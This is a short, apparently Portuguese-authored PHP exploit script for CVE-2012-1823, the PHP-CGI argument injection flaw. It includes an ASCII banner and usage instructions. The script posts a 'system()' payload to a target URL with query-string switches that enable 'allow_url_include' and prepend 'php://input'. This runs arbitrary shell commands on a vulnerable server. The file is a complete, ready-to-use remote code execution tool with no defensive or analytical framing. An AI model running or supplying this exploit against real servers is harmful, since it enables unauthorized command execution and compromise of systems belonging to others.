<?php

echo "
[#] Desenvolvido por ::
      _                                                    __
      .---.        .-----------
     /     \\  __  /    ------
    / /     (  )/    -----
   //////     /     ---
  //// / //        ---
 // /   /  /      --    CVE-2012-1823
//          //..\\      https://github.com/Fatalitysec
       ====UU====UU===========================
           '//||\\`\n\n";

function explorar($rhost, $comando) {
    $payload = "<?php system('$comando'); die(); ?>";

    $url = $rhost . "/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input";

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
    $resposta = curl_exec($ch);
    curl_close($ch);

    if (!$resposta) {
        echo "[!] Falha na exploração!\n";
    } else {
        echo $resposta . "\n";
    }
}

// 
if ($argc != 3) {
    echo "[!] Uso: php exploit.php <RHOST> \"<COMANDO>\"\n";
    echo "Exemplo: php exploit.php http://10.128.20.2 \"whoami\"\n";
    exit(1);
}

$rhost = $argv[1];
$comando = $argv[2];

// Executa a exploração
explorar($rhost, $comando);
